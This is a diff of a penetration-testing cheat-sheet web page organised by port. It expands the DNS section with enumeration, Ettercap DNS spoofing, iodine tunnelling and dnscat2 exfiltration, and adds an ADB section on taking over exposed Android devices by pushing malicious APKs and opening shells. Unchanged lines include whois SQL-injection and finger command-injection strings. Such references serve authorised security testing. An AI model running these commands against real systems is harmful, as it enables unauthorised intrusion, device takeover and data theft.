@@ -581,9 +581,9 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#port-53-dns" class="md-nav__link">
+  <a href="#port-53-dns-domain-name-system" class="md-nav__link">
     <span class="md-ellipsis">
-      Port 53 - DNS
+      Port 53 - DNS (Domain Name System)
     </span>
   </a>
   
@@ -782,6 +782,15 @@
   <a href="#port-5432-postgresql" class="md-nav__link">
     <span class="md-ellipsis">
       Port 5432 - PostgreSQL
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#port-5555-adb-android-debug-bridge" class="md-nav__link">
+    <span class="md-ellipsis">
+      Port 5555 - ADB (Android Debug Bridge)
     </span>
   </a>
   
@@ -3259,10 +3268,6 @@
       
         
       
-        
-      
-        
-      
     
     
       
@@ -3320,6 +3325,8 @@
       
         
           
+        
+      
         
       
         
@@ -3392,14 +3399,6 @@
 
               
             
-          </ul>
-        </nav>
-      
-    </li>
-  
-
-              
-            
               
                 
   
@@ -3422,23 +3421,9 @@
 
               
             
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../../post-exploitation/windows/kerberos-attacks/" class="md-nav__link">
-        
-  
-  <span class="md-ellipsis">
-    Kerberos Attacks
-    
-  </span>
-  
-
-      </a>
+          </ul>
+        </nav>
+      
     </li>
   
 
@@ -3673,13 +3658,94 @@ Receive:
 <span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;domain.com&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>nc<span class="w"> </span>-vn<span class="w"> </span><span class="m">10</span>.10.1.111<span class="w"> </span><span class="m">43</span>
 whois<span class="w"> </span>-h<span class="w"> </span><span class="m">10</span>.10.1.111<span class="w"> </span>-p<span class="w"> </span><span class="m">43</span><span class="w"> </span><span class="s2">&quot;a&#39;) or 1=1#&quot;</span>
 </code></pre></div>
-<h2 id="port-53-dns">Port 53 - DNS</h2>
-<div class="highlight"><pre><span></span><code><span class="c1"># Transfer zone</span>
+<h2 id="port-53-dns-domain-name-system">Port 53 - DNS (Domain Name System)</h2>
+<div class="highlight"><pre><span></span><code><span class="c1"># Nmap script to identify DNS services</span>
+nmap<span class="w"> </span>-p<span class="w"> </span><span class="m">53</span><span class="w"> </span>--script<span class="o">=</span>dns-nsid<span class="w"> </span>&lt;DNS_IP&gt;
 
-dig<span class="w"> </span>AXFR<span class="w"> </span>domain.com<span class="w"> </span>@10.10.10.10
-<span class="c1"># dig +multi AXFR @ns1.insecuredns.com insecuredns.com</span>
-dnsrecon<span class="w"> </span>-t<span class="w"> </span>axfr<span class="w"> </span>-d<span class="w"> </span>domain
-fierce<span class="w"> </span>-dns<span class="w"> </span>domain.com
+<span class="c1"># Banner Grabbing using dig</span>
+dig<span class="w"> </span>version.bind<span class="w"> </span>CHAOS<span class="w"> </span>TXT<span class="w"> </span>@&lt;DNS_IP&gt;
+
+<span class="c1"># Banner Grabbing using netcat</span>
+nc<span class="w"> </span>-nv<span class="w"> </span>-u<span class="w"> </span>&lt;DNS_IP&gt;<span class="w"> </span><span class="m">53</span>
+
+<span class="c1"># Discover authoritative DNS servers</span>
+dig<span class="w"> </span>NS<span class="w"> </span>an4kein.com
+nslookup<span class="w"> </span>-type<span class="o">=</span>NS<span class="w"> </span>an4kein.com
+
+<span class="c1"># DNS record enumeration with dig</span>
+dig<span class="w"> </span>an4kein.com
+dig<span class="w"> </span>A<span class="w"> </span>an4kein.com
+dig<span class="w"> </span>-x<span class="w"> </span>&lt;IP_ADDRESS&gt;<span class="w">                      </span><span class="c1"># Reverse DNS lookup</span>
+dig<span class="w"> </span>@&lt;DNS_SERVER_IP&gt;<span class="w"> </span>an4kein.com<span class="w">        </span><span class="c1"># Specify custom DNS server</span>
+
+<span class="c1"># DNS enumeration with nslookup</span>
+nslookup<span class="w"> </span>an4kein.com
+nslookup<span class="w"> </span>-type<span class="o">=</span>MX<span class="w"> </span>an4kein.com
+nslookup<span class="w"> </span>an4kein.com<span class="w"> </span>&lt;DNS_IP&gt;
+
+<span class="c1"># DNS enumeration with host</span>
+host<span class="w"> </span>an4kein.com
+host<span class="w"> </span>-t<span class="w"> </span>MX<span class="w"> </span>an4kein.com
+host<span class="w"> </span>&lt;IP_ADDRESS&gt;
+
+<span class="c1"># Query all available DNS records</span>
+dig<span class="w"> </span>any<span class="w"> </span>an4kein.com<span class="w"> </span>@&lt;DNS_IP&gt;
+
+<span class="c1"># Attempt DNS zone transfer (AXFR)</span>
+dig<span class="w"> </span>axfr<span class="w"> </span>@&lt;DNS_IP&gt;
+dig<span class="w"> </span>axfr<span class="w"> </span>@&lt;DNS_IP&gt;<span class="w"> </span>an4kein.com
+fierce<span class="w"> </span>--domain<span class="w"> </span>an4kein.com<span class="w"> </span>--dns-servers<span class="w"> </span>&lt;DNS_IP&gt;
+
+<span class="c1"># Metasploit and Nmap DNS modules</span>
+msfconsole
+use<span class="w"> </span>auxiliary/gather/enum_dns
+nmap<span class="w"> </span>-n<span class="w"> </span>--script<span class="w"> </span><span class="s2">&quot;(default and *dns*) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport&quot;</span><span class="w"> </span>&lt;IP&gt;
+
+<span class="c1"># DNS brute force and reverse DNS sweep</span>
+dnsrecon<span class="w"> </span>-r<span class="w"> </span><span class="m">127</span>.0.0.0/24<span class="w"> </span>-n<span class="w"> </span>&lt;DNS_IP&gt;
+dnsrecon<span class="w"> </span>-r<span class="w"> </span>&lt;CIDR&gt;<span class="w"> </span>-n<span class="w"> </span>&lt;DNS_IP&gt;
+dnsrecon<span class="w"> </span>-d<span class="w"> </span>an4kein.com<span class="w"> </span>-a<span class="w"> </span>-n<span class="w"> </span>&lt;DNS_IP&gt;
+
+<span class="c1"># DNS Cache Snooping</span>
+dnsrecon<span class="w"> </span>-t<span class="w"> </span>std<span class="w"> </span>-d<span class="w"> </span>an4kein.com<span class="w"> </span>-D<span class="w"> </span>/usr/share/dnsrecon/namelist.txt
+
+<span class="c1"># DNS enumeration via Google Dorks</span>
+<span class="c1"># site:&lt;domain&gt; -www.&lt;domain&gt; -site:www.&lt;domain&gt;</span>
+site:an4kein.com<span class="w"> </span>-www.an4kein.com<span class="w"> </span>-site:www.an4kein.com
+
+<span class="c1"># DNS enumeration using Maltego (visual)</span>
+maltego
+
+<span class="c1"># Online Tools:</span>
+<span class="c1"># https://dnsdumpster.com</span>
+<span class="c1"># https://dnsrecon.com</span>
+<span class="c1"># https://spyse.com</span>
+<span class="c1"># https://securitytrails.com</span>
+<span class="c1"># https://dnslytics.com</span>
+
+<span class="c1"># Certificate Transparency log monitoring for subdomains</span>
+<span class="c1"># https://certspotter.com</span>
+
+<span class="c1"># DNS Spoofing with Ettercap</span>
+ettercap<span class="w"> </span>-T<span class="w"> </span>-q<span class="w"> </span>-M<span class="w"> </span>arp:remote<span class="w"> </span>/&lt;gateway-ip&gt;//<span class="w"> </span>/&lt;target-ip&gt;//<span class="w"> </span>-P<span class="w"> </span>dns_spoof
+
+<span class="c1"># DNS tunneling with iodine</span>
+<span class="c1"># Server</span>
+iodined<span class="w"> </span>-f<span class="w"> </span>-c<span class="w"> </span>&lt;tunnel-ip&gt;<span class="w"> </span>an4kein.com
+<span class="c1"># Client</span>
+iodine<span class="w"> </span>&lt;dns-server-ip&gt;<span class="w"> </span>an4kein.com
+
+<span class="c1"># Cache Snooping (post-exploitation)</span>
+dig<span class="w"> </span>@&lt;dns-server&gt;<span class="w"> </span>an4kein.com<span class="w"> </span>+norecurse
+
+<span class="c1"># Reverse DNS lookup (post-exploitation)</span>
+dig<span class="w"> </span>-x<span class="w"> </span>&lt;ip-address&gt;
+
+<span class="c1"># DNS exfiltration using dnscat2</span>
+<span class="c1"># Server</span>
+dnscat2<span class="w"> </span>--dns<span class="w"> </span><span class="nv">server</span><span class="o">=</span>&lt;dns-server-ip&gt;:53
+<span class="c1"># Client</span>
+dnscat2<span class="w"> </span>an4kein.com
 </code></pre></div>
 <h2 id="port-69-udp-tftp">Port 69 - UDP - TFTP</h2>
 <ul>
@@ -3701,7 +3767,7 @@ finger<span class="w"> </span><span class="s2">&quot;|/bin/id@example.com&quot;<
 finger<span class="w"> </span><span class="s2">&quot;|/bin/ls -a /@example.com&quot;</span>
 </code></pre></div>
 <h2 id="port-88-kerberos">Port 88 - Kerberos</h2>
-<p>Check <a href="../../post-exploitation/windows/ad/kerberos-attacks/">Kerberos dedicated</a> section</p>
+<p><a href="../../post-exploitation/windows/ad/kerberos-attacks/">Kerberos Attacks</a></p>
 <div class="highlight"><pre><span></span><code>nmap<span class="w"> </span>-p<span class="w"> </span><span class="m">88</span><span class="w"> </span>--script<span class="o">=</span>krb5-enum-users<span class="w"> </span>--script-args<span class="o">=</span><span class="s2">&quot;krb5-enum-users.realm=&#39;DOMAIN.LOCAL&#39;&quot;</span><span class="w"> </span>IP
 use<span class="w"> </span>auxiliary/gather/kerberos_enumusers<span class="w"> </span><span class="c1"># MSF</span>
 
@@ -4866,6 +4932,60 @@ admin<span class="w"> </span>:<span class="w"> </span>admin
 admin<span class="w"> </span>:<span class="w"> </span>password
 
 pg_dump<span class="w"> </span>--host<span class="o">=</span><span class="m">10</span>.10.1.111<span class="w"> </span>--username<span class="o">=</span>postgres<span class="w"> </span>--password<span class="w"> </span>--dbname<span class="o">=</span>template1<span class="w"> </span>--table<span class="o">=</span><span class="s1">&#39;users&#39;</span><span class="w"> </span>-f<span class="w"> </span>output_pgdump
+</code></pre></div>
+<h2 id="port-5555-adb-android-debug-bridge">Port 5555 - ADB (Android Debug Bridge)</h2>
+<div class="highlight"><pre><span></span><code><span class="c1"># ADB (Android Debug Bridge) - Port 5555</span>
+<span class="c1"># ADB allows communication and control over Android devices, often used in debugging.</span>
+<span class="c1"># If left exposed, attackers may gain full control of the device.</span>
+
+<span class="c1"># ─────────────────────────────</span>
+<span class="c1"># 🔎 Recon - Detecting ADB Port</span>
+<span class="c1"># ─────────────────────────────</span>
+nmap<span class="w"> </span>-p<span class="w"> </span><span class="m">5555</span><span class="w"> </span>&lt;target-ip&gt;<span class="w">                   </span><span class="c1"># Check if ADB port is open</span>
+adb<span class="w"> </span>connect<span class="w"> </span>&lt;ip&gt;:5555<span class="w">                      </span><span class="c1"># Connect to remote ADB over TCP/IP</span>
+adb<span class="w"> </span>devices<span class="w">                                </span><span class="c1"># List all connected ADB devices</span>
+
+<span class="c1"># ─────────────────────────────</span>
+<span class="c1"># 🛠️ Ghost Framework - ADB Exploitation</span>
+<span class="c1"># ─────────────────────────────</span>
+git<span class="w"> </span>clone<span class="w"> </span>https://github.com/EntySec/ghost
+<span class="nb">cd</span><span class="w"> </span>ghost
+chmod<span class="w"> </span>+x<span class="w"> </span>install.sh
+./install.sh
+ghost
+
+<span class="c1"># After launching Ghost:</span>
+ghost&gt;<span class="w"> </span>connect<span class="w"> </span>&lt;ip&gt;:5555<span class="w">                   </span><span class="c1"># Connect to the device</span>
+ghost&gt;<span class="w"> </span>deviceinfo<span class="w">                          </span><span class="c1"># View device information</span>
+ghost&gt;<span class="w"> </span>ls<span class="w">                                  </span><span class="c1"># List files on the device</span>
+
+<span class="c1"># ─────────────────────────────</span>
+<span class="c1"># 📤 File Transfer</span>
+<span class="c1"># ─────────────────────────────</span>
+adb<span class="w"> </span>pull<span class="w"> </span>/sdcard/secret.txt<span class="w"> </span>.<span class="w">              </span><span class="c1"># Download file from device</span>
+adb<span class="w"> </span>push<span class="w"> </span>exploit.apk<span class="w"> </span>/sdcard/<span class="w">              </span><span class="c1"># Upload malicious APK to device</span>
+
+<span class="c1"># ─────────────────────────────</span>
+<span class="c1"># ⚙️ Common ADB Post-Exploitation Commands</span>
+<span class="c1"># ─────────────────────────────</span>
+adb<span class="w"> </span>shell<span class="w">                                  </span><span class="c1"># Open interactive shell on device</span>
+adb<span class="w"> </span>install<span class="w"> </span>payload.apk<span class="w">                    </span><span class="c1"># Install malicious APK</span>
+adb<span class="w"> </span>uninstall<span class="w"> </span>com.example.app<span class="w">              </span><span class="c1"># Uninstall an app</span>
+adb<span class="w"> </span>logcat<span class="w">                                 </span><span class="c1"># View live system logs</span>
+adb<span class="w"> </span>reboot<span class="w">                                 </span><span class="c1"># Reboot the device remotely</span>
+
+adb<span class="w"> </span>shell<span class="w"> </span>am<span class="w"> </span>start<span class="w"> </span>-n<span class="w"> </span>com.pkg/.MainActivity<span class="w">   </span><span class="c1"># Launch a specific app</span>
+adb<span class="w"> </span>shell<span class="w"> </span>pm<span class="w"> </span>list<span class="w"> </span>packages<span class="w">                 </span><span class="c1"># List all installed packages</span>
+adb<span class="w"> </span>shell<span class="w"> </span>dumpsys<span class="w">                          </span><span class="c1"># Dump system services and info</span>
+adb<span class="w"> </span>shell<span class="w"> </span>screencap<span class="w"> </span>/sdcard/snap.png<span class="w">       </span><span class="c1"># Capture screenshot to device</span>
+adb<span class="w"> </span>shell<span class="w"> </span>input<span class="w"> </span>keyevent<span class="w"> </span>KEYCODE_POWER<span class="w">     </span><span class="c1"># Simulate pressing power button</span>
+
+<span class="c1"># ─────────────────────────────</span>
+<span class="c1"># 📚 Useful References</span>
+<span class="c1"># https://github.com/EntySec/ghost</span>
+<span class="c1"># https://developer.android.com/studio/command-line/adb</span>
+<span class="c1"># https://book.hacktricks.xyz/mobile-apps-pentesting/android-pentesting/adb</span>
+<span class="c1"># ─────────────────────────────</span>
 </code></pre></div>
 <h2 id="port-5900-vnc">Port 5900 - VNC</h2>
 <div class="highlight"><pre><span></span><code>nmap<span class="w"> </span>--script<span class="o">=</span>vnc-info,vnc-brute,vnc-title<span class="w"> </span>-p<span class="w"> </span><span class="m">5900</span><span class="w"> </span><span class="m">10</span>.11.1.111
